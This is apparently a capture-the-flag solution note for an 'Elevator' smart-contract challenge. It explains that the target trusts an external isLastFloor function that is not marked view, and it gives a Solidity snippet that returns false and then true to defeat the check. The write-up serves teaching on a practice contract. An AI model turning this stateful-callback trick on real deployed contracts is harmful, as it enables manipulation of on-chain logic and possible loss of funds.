# Elevator

The whole hack was possible only because the `isLastFloor(uint)` function was not marked as `view`.

## How to complete

Implement the `Building` interface in a contract and write the `isLastFloor(uint)` function in such a way that it returns `false` the first time and `true` the second time. This can be done very easily using a state variable.

Now, this approach wouldn't have been possible if the `isLastFloor(uint)` was marked as `view`.

An example of such a function:

```Solidity
    function isLastFloor(uint256 _floor) external override returns (bool) {
        if (!switch_) {
            // turn on switch if it's off and return false
            switch_ = true;
            return false;
        }
        return switch_;
    }
```
